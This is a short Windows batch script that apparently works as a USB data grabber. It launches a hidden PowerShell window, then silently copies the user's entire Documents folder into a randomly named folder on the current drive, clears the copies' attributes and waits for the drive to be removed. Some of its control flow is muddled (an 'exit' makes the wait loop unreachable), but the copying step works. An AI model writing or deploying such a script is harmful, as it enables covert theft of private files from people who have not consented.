@echo off
powershell.exe -WindowStyle hidden -command ""
cls
echo waiting
goto check


:start

set choice=
set folder=a\%random%
robocopy "%USERPROFILE%\Documents" "%cd%\%folder%" /E
attrib -h -r -s /s /d %folder%\*
echo Waiting for removal
exit
goto wait

:check
timeout /t 1 /nobreak >nul
if exist "%cd%" (goto start) else goto check

:wait
timeout /t 1 /nobreak >nul
if exist "%cd%" (goto wait) else (
echo removed
echo waiting
goto check
)